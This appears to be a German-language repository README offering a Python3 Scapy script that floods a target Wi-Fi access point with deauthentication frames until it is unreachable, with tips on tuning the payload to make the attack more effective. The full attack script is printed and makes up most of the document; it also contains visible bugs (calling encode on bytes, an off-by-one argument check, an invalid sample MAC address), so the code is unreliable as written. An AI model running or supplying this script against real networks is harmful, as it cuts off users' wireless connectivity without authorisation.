# Python3-Deauthentification-Attack
Python3 Programming 
Das Script greift auf das "Scapy" -Modul von Python3 zu und sendet bestimmte Packete zu einer BSSID-Addresse, bis diese nicht mehr 
erreibar ist.


    Du kannst die dazugeörige Nachricht, die in Zeile 16 ist, ändern. Somit ist der Angriff effektiver.
    Hier gibt es aber auch eine bestimmte Zahl an Bytes, die die Größe der Nachricht nicht überschreiten darf.
    
    
Example (eigener Text):
        
        pkg = "ich bin eine große nachricht ahahhahahahahahahha"
        msg = pkg.encode()
    
Example (mit Modul "random"):
        
        import random #muss am anfang des Scripts eingefügt werden
        msg = random._urandom(44)
    

Script mit Modul "random":


    from scapy.all import *
    import sys,random
    from colorama import *

    init()
    if (len(sys.argv) < 3):
        print(" ")
        print(" ")
        print("[!] I need the target BSSID, COUNTER and the Size of the Message!")
        print(" ")
        print(" ")
        print("[*] Example: python deauth.py aa:1V:3C:dd:ee:ff 1000 44")
        print(" ")
        quit()
    size = sys.argv[3]
    brdmac = "aa:bb:cc:dd:ee:ff"
    pkg = random._urandom(int(size))
    msg = pkg.encode()
    packet = (RadioTap()/Dot11(addr1 = brdmac, addr2 = sys.argv[1], addr3 = sys.argv[1])/Dot11Deauth()
            /(msg))
    print(Fore.YELLOW)
    sendp(packet,count=int(sys.argv[2]))
